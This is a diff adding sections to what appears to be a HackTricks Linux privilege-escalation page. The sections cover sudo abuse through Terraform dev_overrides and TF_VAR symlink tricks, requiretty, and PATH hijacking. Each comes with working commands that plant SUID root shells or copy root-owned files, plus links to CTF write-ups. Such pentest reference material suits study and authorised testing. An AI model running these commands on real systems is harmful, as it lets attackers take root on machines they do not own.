@@ -985,8 +985,75 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
   - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
   - Consider sudo I/O logging and alerting when preserved env vars are used.
 
-### Sudo execution bypassing paths
+### Terraform via sudo with preserved HOME (!env_reset)
 
+If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.
+
+- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
+
+```hcl
+# ~/.terraformrc
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/dev/shm"
+  }
+  direct {}
+}
+```
+
+```bash
+cat >/dev/shm/terraform-provider-examples <<'EOF'
+#!/bin/bash
+cp /bin/bash /var/tmp/rootsh
+chown root:root /var/tmp/rootsh
+chmod 6777 /var/tmp/rootsh
+EOF
+chmod +x /dev/shm/terraform-provider-examples
+sudo /usr/bin/terraform -chdir=/opt/examples apply
+```
+
+Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.
+
+### TF_VAR overrides + symlink validation bypass
+
+Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:
+
+```bash
+mkdir -p /dev/shm/root/examples
+ln -s /root/root.txt /dev/shm/root/examples/flag
+TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
+cat /home/$USER/docker/previous/public/examples/flag
+```
+
+Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **write** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).
+
+### requiretty / !requiretty
+
+On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
+
+```bash
+Defaults !requiretty
+```
+
+This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.
+
+### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
+
+If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.
+
+- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
+
+```bash
+cat > ~/bin/free <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x ~/bin/free
+sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
+bash -p                                # root shell via SUID bit
+```
+
+### Sudo execution bypassing paths
 **Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
 
 ```bash
@@ -1800,6 +1867,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 
 - [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
 - [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
+- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
 - [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
 - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
@@ -1821,7 +1889,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
 - [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
+- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
